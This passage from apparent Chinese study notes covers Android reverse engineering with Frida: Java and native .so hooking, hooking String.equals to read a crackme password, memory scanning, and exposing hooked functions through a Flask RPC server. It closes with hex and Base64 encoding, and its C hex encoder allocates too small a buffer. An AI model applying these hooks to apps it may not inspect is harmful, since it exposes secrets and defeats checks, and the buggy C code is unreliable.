function_">getObjClassName</span>(obj);</span><br><span class="line">    <span class="keyword">var</span> target = <span class="title class_">Java</span>.<span class="title function_">use</span>(listener_name);</span><br><span class="line">    <span class="keyword">if</span> (!target || !mtdName <span class="keyword">in</span> target) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// send(&quot;[WatchEvent] hooking &quot; + mtdName + &quot;: &quot; + listener_name);</span></span><br><span class="line">    target[mtdName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">overload</span>) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">//send(&quot;[WatchEvent] &quot; + mtdName + &quot;: &quot; + getObjClassName(this));</span></span><br><span class="line">            <span class="title function_">printStacks</span>(<span class="string">&quot;WatchEvent&quot;</span>+mtdName)</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[WatchEvent] &quot;</span> + mtdName + <span class="string">&quot;: &quot;</span> + <span class="title function_">getObjClassName</span>(<span class="variable language_">this</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>[mtdName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OnClickListener</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//以spawn启动进程的模式来attach的话</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.view.View&quot;</span>).<span class="property">setOnClickListener</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">listener</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (listener != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="title function_">watch</span>(listener, <span class="string">&#x27;onClick&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setOnClickListener</span>(listener);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果frida以attach的模式进行attch的话</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.view.View$ListenerInfo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                instance = instance.<span class="property">mOnClickListener</span>.<span class="property">value</span>;</span><br><span class="line">                <span class="keyword">if</span> (instance) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mOnClickListener name is :&quot;</span> + <span class="title function_">getObjClassName</span>(instance));</span><br><span class="line">                    <span class="title function_">watch</span>(instance, <span class="string">&#x27;onClick&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title class_">OnClickListener</span>);</span><br></pre></td></tr></table></figure>



<h2 id="实战-1"><a href="#实战-1" class="headerlink" title="实战 1"></a>实战 1</h2><p><a href="https://www.52pojie.cn/thread-1446044-1-1.html">https://www.52pojie.cn/thread-1446044-1-1.html</a></p>
<p>手动思路：</p>
<p>1、反编译源码，通过apk按钮定位到触发的类，以及多个疑似触发方法</p>
<p>2、通过 wallbreak dump出触发时的内存变量，定位到具体的触发方法</p>
<p>3、审视代码，定位密码变量，直接在内存中看</p>
<p>遗留问题：</p>
<p>1、frida 的 hook setOnClickListener 脚本无法手动注入</p>
<p>2、扒第一关源码算法后，打印的值疑似加密，但代码逻辑无加密</p>
<p>坑点：</p>
<p>1、hook equals 到死</p>
<p>2、要用 –no-pause 以免程序暂停</p>
<p>3、编写算法时，类可能会在 onstart 等地方初始化，或是依托特有代码进行处理（用 sendEmptyMessage 发送。handleMessage中处理）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Str</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">    <span class="title class_">Str</span>.<span class="property">equals</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a1</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(a1);</span><br><span class="line">        <span class="keyword">var</span> re = <span class="variable language_">this</span>.<span class="title function_">equals</span>(a1);</span><br><span class="line">        <span class="keyword">return</span> re;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h2 id="Hook-系统SO-amp-静态注册SO函数"><a href="#Hook-系统SO-amp-静态注册SO函数" class="headerlink" title="Hook 系统SO &amp; 静态注册SO函数"></a>Hook 系统SO &amp; 静态注册SO函数</h2><p><a href="https://www.anquanke.com/post/id/195215#h2-1">https://www.anquanke.com/post/id/195215#h2-1</a></p>
<p>Process &#x2F; Module &#x2F; Memory &#x2F; Interceptor.attach</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libhookdemo.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> pattern  = <span class="string">&quot;55 41 57 41 56 41 55 41 54 53 48 83 EC 18 49 89 FE 48 BD EF FF FF FF FF FF FF 3F&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">module</span>.<span class="property">base</span>)</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">scan</span>(<span class="variable language_">module</span>.<span class="property">base</span>,<span class="variable language_">module</span>.<span class="property">size</span>,pattern,&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">address,size</span>)&#123;</span><br><span class="line">     <span class="comment">//搜索成功</span></span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;搜索到 &#x27;</span> +pattern +<span class="string">&quot; 地址是:&quot;</span>+ address.<span class="title function_">toString</span>());  </span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onError</span>:<span class="keyword">function</span>(<span class="params">resaon</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;搜索失败&quot;</span>,resaon);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;搜索完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定位并读取系统so</span></span><br><span class="line"><span class="keyword">var</span> pointer = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libc.so&quot;</span>).<span class="property">base</span>; <span class="comment">//系统so</span></span><br><span class="line"><span class="keyword">const</span> r = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">0x10</span>);  <span class="comment">// 分配16个字节</span></span><br><span class="line">r.<span class="title function_">writePointer</span>(pointer);</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(r, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义字符写入内存</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x74</span>];</span><br><span class="line"><span class="keyword">const</span> r = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(arr.<span class="property">length</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">writeByteArray</span>(r,arr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;readCString():&quot;</span>+r.<span class="title function_">readCString</span>());</span><br><span class="line"><span class="keyword">const</span> newPtrstr = r.<span class="title function_">writeUtf8String</span>(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;readCString():&quot;</span>+newPtrstr.<span class="title function_">readCString</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不确定so名，hook其中的导出函数</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x74</span>];</span><br><span class="line"><span class="keyword">var</span> funaddress = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>,<span class="string">&quot;strstr&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funaddress,&#123;</span><br><span class="line">    <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">        <span class="comment">// console.log(args[0].readCString());</span></span><br><span class="line">        <span class="comment">// console.log(args[1].readCString());</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Context information:&#x27;</span>);</span><br><span class="line">        <span class="comment">//输出上下文因其是一个Objection对象，需要它进行接送、转换才能正常看到值</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Context  : &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">context</span>));</span><br><span class="line">        <span class="comment">//输出返回地址</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Return   : &#x27;</span> + <span class="variable language_">this</span>.<span class="property">returnAddress</span>);</span><br><span class="line">        <span class="comment">//输出线程id</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ThreadId : &#x27;</span> + <span class="variable language_">this</span>.<span class="property">threadId</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Depth    : &#x27;</span> + <span class="variable language_">this</span>.<span class="property">depth</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Errornr  : &#x27;</span> + <span class="variable language_">this</span>.<span class="property">err</span>);</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="comment">// var r = Memory.alloc(0x16);</span></span><br><span class="line">        <span class="comment">// r.writeByteArray(arr);</span></span><br><span class="line">        <span class="comment">// retval.replace(r);</span></span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// hook 自实现的静态so函数</span></span><br><span class="line"><span class="keyword">var</span> funaddress1 = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libhookdemo.so&quot;</span>,<span class="string">&quot;Java_com_example_hookdemo_MainActivity_signatureTest&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funaddress1,&#123;</span><br><span class="line">    <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">        <span class="comment">// console.log(hexdump(args[0]));</span></span><br><span class="line">        <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">        <span class="keyword">if</span>(env!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> canshu = env.<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>],<span class="literal">false</span>); <span class="comment">//第几个参数可以ida看</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(canshu.<span class="title function_">readCString</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="comment">// console.log(retval.readCString())</span></span><br><span class="line">        <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">            <span class="keyword">if</span>(env!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> canshu = env.<span class="title function_">getStringUtfChars</span>(retval,<span class="literal">false</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(canshu.<span class="title function_">readCString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主动调用自编写的某个so方法，inlinehook 任意函数，不知道具体函数名，根据地址去hook</span></span><br><span class="line"><span class="keyword">var</span> hookdemo_add = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libhookdemo.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> add_0D64 = hookdemo_add.<span class="title function_">add</span>(<span class="number">0x667A0</span>); <span class="comment">// 此处指定的是此方法在内存中执行首地址</span></span><br><span class="line"><span class="keyword">var</span> newaddString_func  = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(add_0D64,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line"><span class="keyword">var</span> canshu1 = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> canshu2 = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;nihao&quot;</span>);</span><br><span class="line">canshu1 = env.<span class="title function_">getStringUtfChars</span>(canshu1,<span class="literal">false</span>);</span><br><span class="line">canshu2 = env.<span class="title function_">getStringUtfChars</span>(canshu2,<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">var</span> ret = <span class="title function_">newaddString_func</span>(canshu1,canshu2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ret.<span class="title function_">readCString</span>());</span><br><span class="line"><span class="keyword">if</span>(hookdemo_add)&#123;</span><br><span class="line">    <span class="keyword">var</span> add_0D64 = hookdemo_add.<span class="title function_">add</span>(<span class="number">0x667A0</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;add_0D64 =&gt;&quot;</span>,add_0D64);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(add_0D64,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[0] =&gt;&quot;</span>,args[<span class="number">0</span>].<span class="title function_">readCString</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[1] =&gt;&quot;</span>,args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(retval))</span><br><span class="line">            <span class="comment">// console.log(&quot;retval&quot;,retval.readCString());</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">找到某方法的执行首地址</span><br><span class="line"><span class="number">1</span>、直接在<span class="variable constant_">IDA</span>里的导出方法搜索，双击进入到具体的处理逻辑，在开头按<span class="title class_">Tab</span>跳转汇编查看地址</span><br><span class="line"><span class="number">2</span>、找到某个已注册方法，并调用了目标方法，后续操作如上</span><br><span class="line"><span class="number">3</span>、<span class="variable constant_">IDA</span>的导出函数可以（静态so方法，及非动态的方法实现）</span><br></pre></td></tr></table></figure>

<p>1、根据内存中的地址 hook 函数<br>2、不确定 so 名，hook 其中的导出函数<br>3、hook 自实现的静态 so 函数<br>4、根据内存地址去主动调用函数</p>
<h2 id="Hook-动态注册SO函数："><a href="#Hook-动态注册SO函数：" class="headerlink" title="Hook 动态注册SO函数："></a>Hook 动态注册SO函数：</h2><p><a href="https://github.com/lasting-yang/frida_hook_libart">https://github.com/lasting-yang/frida_hook_libart</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原生打印出来的 symbols 需要转换</span><br><span class="line">https://demangler.com/</span><br><span class="line"></span><br><span class="line">hook sayhello，不知道包名求出这个注册函数的地址</span><br><span class="line">RegisterNatives 函数专门用于动态注册，hook这个就行</span><br><span class="line">动态注册在启动时就注入，用 attach 模式</span><br><span class="line">Process.findModuleByName(&quot;libhookdemo.so&quot;) // 得到当前进程内so的地址 </span><br><span class="line"></span><br><span class="line">1、hook所有的so函数</span><br><span class="line">2、hook动态注册函数</span><br></pre></td></tr></table></figure>



<h2 id="RPC-开放调用Java层和SO层函数"><a href="#RPC-开放调用Java层和SO层函数" class="headerlink" title="RPC 开放调用Java层和SO层函数"></a>RPC 开放调用Java层和SO层函数</h2><p>应用场景：<a href="https://bbs.kanxue.com/thread-259862.htm">https://bbs.kanxue.com/thread-259862.htm</a></p>
<p>修改默认端口(27042)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frida-server -l 0.0.0.0:port</span><br><span class="line">frida -H ip:port -F</span><br></pre></td></tr></table></figure>

<p>用 web 服务(flask)映射手机内的接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">javafunc</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> perins = <span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> perclass =  <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>);</span><br><span class="line">        perins = perclass.$new(name,<span class="number">20</span>,<span class="string">&quot;zhongguo&quot;</span>);</span><br><span class="line">       </span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">send</span>(perins.<span class="title function_">getName</span>())</span><br><span class="line">    <span class="keyword">var</span> recy = <span class="title function_">recv</span>(<span class="string">&#x27;poke&#x27;</span>,<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(value.<span class="property">payload</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    recy.<span class="title function_">wait</span>()</span><br><span class="line">    <span class="keyword">return</span> perins.<span class="title function_">getName</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sofunc</span>(<span class="params">a1,a2</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> hookdemo_add = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libhookdemo.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> add_0D64 = hookdemo_add.<span class="title function_">add</span>(<span class="number">0x60D54</span>);</span><br><span class="line">    <span class="keyword">var</span> newaddString_func  = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(add_0D64,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line">    <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">    <span class="keyword">var</span> canshu1 = env.<span class="title function_">newStringUtf</span>(a1);</span><br><span class="line">    <span class="keyword">var</span> canshu2 = env.<span class="title function_">newStringUtf</span>(a2);</span><br><span class="line">    canshu1 = env.<span class="title function_">getStringUtfChars</span>(canshu1,<span class="literal">false</span>);</span><br><span class="line">    canshu2 = env.<span class="title function_">getStringUtfChars</span>(canshu2,<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="title function_">newaddString_func</span>(canshu1,canshu2);</span><br><span class="line">    <span class="keyword">return</span> ret.<span class="title function_">readCString</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">javafun</span>:javafunc,</span><br><span class="line">    <span class="attr">sofunc</span>:sofunc,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> flask,requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="comment"># print(message)</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line">        script.post(&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;poke&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;woshipython&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">elif</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;error&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&#x27;stack&#x27;</span>])</span><br><span class="line"><span class="comment">#直接运行python脚本即可，注入程序在Python指定</span></span><br><span class="line"><span class="comment">#进程名称附加</span></span><br><span class="line">session = frida.get_usb_device(<span class="number">5000</span>).attach(<span class="string">&#x27;com.example.hookdemo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#spwan 模式</span></span><br><span class="line"><span class="comment"># devices = frida.get_usb_device(5000)</span></span><br><span class="line"><span class="comment"># pid = devices.spawn([&#x27;com.example.hookdemo&#x27;])</span></span><br><span class="line"><span class="comment"># session = devices.attach(pid)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#连接非标准端口</span></span><br><span class="line"><span class="comment"># session = frida.get_device_manager().add_remote_device(&quot;192.168.10.5:1234&quot;).attach(&#x27;com.example.hookdemo&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># source = &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 获取js脚本的功能代码</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./function.js&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    source = f.read()</span><br><span class="line"><span class="comment"># print(source)</span></span><br><span class="line"></span><br><span class="line">script = session.create_script(source)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="comment">#spwan模式多出来的</span></span><br><span class="line"><span class="comment"># devices.resume(pid)</span></span><br><span class="line"><span class="comment"># time.sleep(1)</span></span><br><span class="line"><span class="comment"># print(script.exports.javafun(&quot;nihao&quot;))</span></span><br><span class="line"><span class="comment"># print(script.exports.sofunc(&quot;nihao&quot;,&quot;muyang&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注册路由，并写响应函数index</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    s1 = request.args.get(<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">    s2 = request.args.get(<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> script.exports.sofunc(s1,s2)</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)  <span class="comment"># 运行程序  # app.run(host, port, debug, options)</span></span><br></pre></td></tr></table></figure>

<p>1、js 编写 frida 脚本，把函数导出<br>2、python 脚本调用 js 导出函数，开启 flask 服务供第三方调用<br>3、frida Python与js脚本交互</p>
<p><a href="https://blog.csdn.net/Qwertyuiop2016/article/details/114286877">https://blog.csdn.net/Qwertyuiop2016/article/details/114286877</a></p>
<h2 id="Hook-interface接口"><a href="#Hook-interface接口" class="headerlink" title="Hook interface接口"></a>Hook interface接口</h2><p>搜 implement 关键词</p>
<h1 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h1><h2 id="URLTOHEX"><a href="#URLTOHEX" class="headerlink" title="URLTOHEX"></a>URLTOHEX</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// unsigned char 数组来存储字符串时，内部的字符会以其对应的 ASCII 值进行存储</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encodeToHex</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* data,<span class="type">int</span> dataSize,<span class="type">char</span>* encodeData)</span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* hexChars = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>,j=<span class="number">0</span>; i&lt;dataSize; ++i)&#123;</span><br><span class="line">        <span class="comment">// 此处data[i]已经转换</span></span><br><span class="line">        <span class="comment">// data[i] = 109(m) &gt;&gt; 4 = 01101101 &gt;&gt; 4 = 0110 &amp; 0x0f </span></span><br><span class="line">        <span class="comment">// 高四位 &amp; 0x0f</span></span><br><span class="line">        encodeData[j++] = hexChars[(data[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0f</span>]; </span><br><span class="line">        <span class="comment">// 低四位 &amp; 0x0f</span></span><br><span class="line">        encodeData[j++] = hexChars[data[i] &amp; <span class="number">0x0f</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    encodeData[j]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 一个字符一个字节</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* inputData = <span class="string">&quot;muxss&quot;</span>;</span><br><span class="line">    <span class="type">int</span> inputSize = <span class="built_in">strlen</span>(inputData);</span><br><span class="line">    <span class="type">char</span> encodeOutPut[<span class="built_in">strlen</span>(inputData)];</span><br><span class="line">    encodeToHex(inputData,inputSize,encodeOutPut);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Encode data: %s\n&quot;</span>,encodeOutPut); </span><br><span class="line">    <span class="comment">// 6D75787373</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>字符串转换为十六进制的原理是逐个字符读取字符串中的每个字符，获取其对应的 ASCII 值，然后将该整数值转换为十六进制表示。</p>
<p>每个字符占一个字节，两个十六进制</p>
<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>ASCII 编码用 256(2的8次方)个字符对二进制数据进行编码</p>
<p>Base64 用 64(2的6次方)个字符对二进制数据进行编码，二进制数据到字符的过程</p>
<p>原理：</p>
<ul>
<li>用 64（2的6次方）个特定的 ASCII 字符来表示 256（2的8次方）个 ASCII 字符，也就是说三个 ASCII 字符经过 Base64 编码后变为四个 ASCII 字符显示（公约数为24），编码后数据长度比原来增加 1&#x2F;3，不足 3n用”&#x3D;”补齐。</li>
<li>小写字母a-z、大写字母A-Z、数字0-9、符号”+”、”&#x2F;“（再加上作为垫字的”&#x3D;”，实际上是65个字符）有时候+&#x2F;会变成 - , _</li>
<li>第一步：将每三个字节作为一组，一个是24个二进制位</li>
<li>第二步，将这24个二进制位分为四组，每个组有6个二进制位</li>
<li>第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节</li>
<li>第四步，根据下表，得到扩展后的每个字节的对应符号，就是Base64的编码值</li>
<li>Base64编码表自查</li>
</ul>
